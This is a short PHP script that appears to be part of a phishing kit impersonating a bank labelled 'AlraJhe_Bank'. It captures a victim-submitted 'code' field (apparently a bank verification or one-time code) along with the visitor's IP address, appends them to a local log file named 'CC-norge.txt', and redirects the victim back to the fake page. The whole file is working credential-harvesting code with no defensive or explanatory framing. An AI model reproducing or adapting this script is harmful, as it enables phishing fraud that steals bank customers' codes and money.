<?php




$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg = "------------------------------------------------------\n";
$bilsmg .= "----------------AlraJhe_Bank----------------\n";
$bilsmg .= "code   : ".$_POST['code']."\n";
$bilsmg .= "--------------------------------------------------------\n";
$bilsmg .= "From : $ip \n";


$file = fopen("CC-norge.txt", 'a');
fwrite($file, $bilsmg);

header('Location: ./index.php');



?>